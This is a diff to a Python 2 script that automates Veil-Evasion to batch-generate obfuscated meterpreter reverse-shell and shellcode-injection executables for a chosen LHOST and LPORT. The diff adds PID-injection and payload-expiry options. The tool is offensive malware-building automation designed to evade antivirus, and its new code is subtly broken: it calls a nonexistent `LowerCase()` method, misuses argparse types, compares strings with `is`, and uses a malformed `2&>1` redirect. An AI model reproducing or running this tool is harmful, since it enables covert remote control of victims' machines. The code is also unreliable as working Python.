@@ -15,9 +15,12 @@ parser = argparse.ArgumentParser(description='Auto Veiled Payload Generator')
 parser.add_argument('-LHOST',metavar='[x.x.x.x]',type=str,help='Local IP Address',required=True)
 parser.add_argument('-LPORT',metavar='PORT NO', type=str,help="Port No",required=True)
 parser.add_argument('-o',metavar='path/to/payloads',type=dir,help='Directory to move all payloads\nDefault is: /home/<user>/payloads/')
-
+parser.add_argument('-d' ,metavar='T/F',type=bool,help='Display output or not')
 args = parser.parse_args()
-
+if args.d.LowerCase() is 't':
+    debug=True
+else:
+    debug=False
 payload_list={
               ("c/meterpreter/rev_http","compile_to_exe=Y use_arya=Y LHOST="+args.LHOST+" LPORT="+args.LPORT),
               ("c/meterpreter/rev_http_service","compile_to_exe=Y use_arya=Y LHOST="+args.LHOST+" LPORT="+args.LPORT),
@@ -39,7 +42,7 @@ payload_list={
               ("python/shellcode_inject/base64_substitution","compile_to_exe=Y use_pyherion=Y --msfpayload=windows/meterpreter/reverse_tcp"),
               ("python/shellcode_inject/des_encrypt","compile_to_exe=Y use_pyherion=Y --msfpayload=windows/meterpreter/reverse_tcp"),
               ("python/shellcode_inject/letter_substitution","compile_to_exe=Y use_pyherion=Y --msfpayload=windows/meterpreter/reverse_tcp"),
-              ("python/shellcode_inject/pidinject","compile_to_exe=Y use_pyherion=Y"),
+              ("python/shellcode_inject/pidinject","compile_to_exe=Y use_pyherion=Y pid_number=1234 expire_payload=7 --msfpayload=windows/meterpreter/reverse_tcp"),
               ("ruby/meterpreter/rev_http","compile_to_exe=Y use_arya=Y --msfpayload=windows/meterpreter/reverse_tcp"),
               ("ruby/meterpreter/rev_https","compile_to_exe=Y use_arya=Y"),
               ("ruby/meterpreter/rev_tcp","compile_to_exe=Y use_arya=Y"),
@@ -65,7 +68,10 @@ if not os.path.exists(path):
 
 print "Payloads will be created as your command...\nNothing can stop you to go for a smoke...\nSo... GO NOW!"
 for payload in payload_list:
-    os.system(CreatePayloadCommand(payload, args.LHOST, args.LPORT)+" > /dev/null") #silenced mode
+    if not debug:
+        os.system(CreatePayloadCommand(payload, args.LHOST, args.LPORT)+" 2&>1 >/dev/null") #silenced mode
+    else:
+        os.system(CreatePayloadCommand(payload, args.LHOST, args.LPORT)+" > /dev/null") #silenced mode
     print "\t[!] Payload: "+payload[0]+" created..." 
 print "All payloads created without a single error :)\nLet me move them for you into: "+path
 os.system("mv /usr/share/veil-evasion/source/* "+path+".")
